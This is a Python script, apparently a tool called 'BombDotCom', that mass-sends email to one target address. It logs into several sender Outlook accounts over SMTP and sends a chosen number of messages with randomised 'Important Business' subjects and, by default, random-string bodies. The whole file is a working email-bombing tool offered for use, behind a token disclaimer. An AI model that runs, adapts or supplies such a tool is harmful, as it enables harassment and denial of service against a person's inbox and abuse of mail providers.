import smtplib
import sys
import ssl
import random
import string
import getpass

def main():
    emails = []
    passwords = []

    print('''\033[0;32m
    ______                 _    ______      _   _____                 
    | ___ \               | |   |  _  \    | | /  __ \                
    | |_/ / ___  _ __ ___ | |__ | | | |___ | |_| /  \/ ___  _ __ ___  
    | ___ \/ _ \| '_ ` _ \| '_ \| | | / _ \| __| |    / _ \| '_ ` _ \ 
    | |_/ / (_) | | | | | | |_) | |/ / (_) | |_| \__/\ (_) | | | | | |
    \____/ \___/|_| |_| |_|_.__/|___/ \___/ \__|\____/\___/|_| |_| |_|  v1.0

            Created by BredSec
    ''')
    print('''\033[0;31m       DISCLAIMER: Developers Not Liable For Any Damages
         Caused By Using This Tool. Use Responsibly.\033[0m''')
    print("\n")
    target_mail = input("Please enter the target email address>> ")
    email_num = input("Please enter the number of emails to be sent>> ")
    try:
        email_num = int(email_num)
    except Exception as error:
        print("Error: " + str(error))
        sys.exit(2)
    sender_num = input("Please enter the number of sending email addresses>> ")
    try:
        sender_num = int(sender_num)
        for i in range(int(sender_num)):
            name = input("Sender email address [" + str(i+1) + "]>> ")
            emails.append(name)
            passwd = getpass.getpass(prompt="Sender email password [" + str(i+1) + "]>> ")
            passwords.append(passwd)
    except Exception as error:
        print("Error: " + str(error))
        sys.exit(2)
    message = input("Type out intended message (default is random strings)>> ")
    
    if message == "":
        message = "".join(random.choices(string.ascii_letters, k=300))
    
    final_num = round(email_num / sender_num)

    for i in range(len(emails)):
        print("Sending emails...")
        for x in range(final_num):
            SendMail(target_mail, emails[i], passwords[i], message)
    
    print("Messages sent!")
    sys.exit(0)

def SendMail(receiver_email, sender_email, password, message):
    try:
        context = ssl.create_default_context()
        with smtplib.SMTP("smtp-mail.outlook.com", 587) as server:
            server.ehlo()
            server.starttls(context=context)
            server.ehlo()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, "From: " + sender_email + "\nTo: " + receiver_email + "\nSubject: Important Business " + str(random.randint(0, 10000)) + "\n\n" + message)
    except Exception as error:
        print("Error: " + str(error))
        sys.exit(2)

if __name__ == "__main__":
    main()